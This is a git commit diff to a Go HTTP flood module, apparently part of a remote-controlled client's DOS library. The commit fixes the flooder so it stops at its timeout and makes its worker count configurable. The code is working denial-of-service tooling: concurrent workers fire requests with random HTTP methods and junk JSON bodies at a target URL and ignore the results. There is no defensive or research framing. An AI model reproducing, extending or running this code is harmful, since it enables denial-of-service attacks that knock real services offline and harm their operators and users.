1d5a0b396c3accfc16b0d9b81106e7cccfceb19e
Xart3mis <ihavemanywaifus@protonmail.com>
2022-10-14 08:28:44 +0200

    fix httpflooder not closing after timeout

--- Client/lib/DOS/httpflood/httpflood.go
+++ Client/lib/DOS/httpflood/httpflood.go
@@ -2,6 +2,7 @@ package httpflood
 
 import (
 	"bytes"
+	"context"
 	"fmt"
 	"math/rand"
 	"net/http"
@@ -13,68 +14,68 @@ import (
 var waitGroup sync.WaitGroup
 var data chan string
 
-func fetchURL(count int) {
+func fetchURL(count int, ctx context.Context) {
 	fmt.Printf("URL fetcher #%d has started ...\n", count)
-	defer func() {
-		fmt.Printf("URL fetcher #%d closing down ...\n", count)
-		waitGroup.Done()
-	}()
 	for {
-		url, ok := <-data
-		var method string
-		var req *http.Request
-		var err error
-
-		if !ok {
-			fmt.Println("The channel is closed!")
-			break
-		}
-
-		client := &http.Client{}
-
-		// Random method: mix things up a bit!
-		switch rand.Intn(7) {
-		case 0:
-			method = "HEAD"
-			req, err = http.NewRequest(method, url, nil)
-		case 1:
-			method = "POST"
-			randomJson := []byte(`{"why":"I do not know.."}`)
-			req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
-		case 2:
-			method = "PUT"
-			randomJson := []byte(`{"why":"Ooh! Ooh! I know!"}`)
-			req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
-		case 3:
-			method = "PATCH"
-			randomJson := []byte(`{"why":"Ah damn, I lost it again."}`)
-			req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
-		case 4:
-			method = "HELP"
-			randomJson := []byte(`{"why":"Really. I lost it. Send help. Kthxbye."}`)
-			req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
-		case 5:
-			method = "MATTIAS"
-			randomJson := []byte(`{"why":"Now I remember. The METHOD can be _anything_."}`)
-			req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
+		select {
+		case <-ctx.Done():
+			fmt.Printf("URL fetcher #%d has stopped...\n", count)
+			return
 		default:
-			method = "GET"
-			req, err = http.NewRequest(method, url, nil)
+			url := <-data
+			var method string
+			var req *http.Request
+			var err error
+
+			client := &http.Client{}
+
+			// Random method: mix things up a bit!
+			switch rand.Intn(7) {
+			case 0:
+				method = "HEAD"
+				req, err = http.NewRequest(method, url, nil)
+			case 1:
+				method = "POST"
+				randomJson := []byte(`{"why":"I do not know.."}`)
+				req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
+			case 2:
+				method = "PUT"
+				randomJson := []byte(`{"why":"Ooh! Ooh! I know!"}`)
+				req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
+			case 3:
+				method = "PATCH"
+				randomJson := []byte(`{"why":"Ah damn, I lost it again."}`)
+				req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
+			case 4:
+				method = "HELP"
+				randomJson := []byte(`{"why":"Really. I lost it. Send help. Kthxbye."}`)
+				req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
+			case 5:
+				method = "MATTIAS"
+				randomJson := []byte(`{"why":"Now I remember. The METHOD can be _anything_."}`)
+				req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
+			default:
+				method = "GET"
+				req, err = http.NewRequest(method, url, nil)
+			}
+
+			if err != nil {
+				fmt.Println(err)
+			}
+
+			client.Do(req)
+
+			// Don't care about exit codes, just get that HTTP call out the door
+			fmt.Printf("#%d: fetched %s \n", count, url)
 		}
-
-		if err != nil {
-			fmt.Println(err)
-		}
-
-		client.Do(req)
-
-		// Don't care about exit codes, just get that HTTP call out the door
-		fmt.Printf("#%d: fetched %s \n", count, url)
 	}
 }
 
 func FloodUrl(target string, timeout time.Duration, workersN int64) error {
 	rand.Seed(time.Now().Unix())
+
+	ctx, cancel := context.WithTimeout(context.Background(), timeout)
+	defer cancel()
 
 	_, err := url.ParseRequestURI(target)
 	if err != nil {
@@ -85,16 +86,19 @@ func FloodUrl(target string, timeout time.Duration, workersN int64) error {
 	data = make(chan string)
 
 	// Start X amount of concurrent fetchers
-	for i := 1; i < 100+1; i++ {
-		waitGroup.Add(1)
-		go fetchURL(i)
-	}
+	go func(ctx context.Context) {
+		for i := int64(1); i < workersN+1; i++ {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				waitGroup.Add(1)
+				go fetchURL(int(i), ctx)
+				data <- (target)
+			}
+		}
+	}(ctx)
 
-	// No fetch X amount of URLs using those fetchers
-	for i := int64(0); i < workersN; i++ {
-		// Randomise the URL a bit, bypass caching
-		data <- (target)
-	}
-
+	<-time.After(timeout)
 	return nil
 }
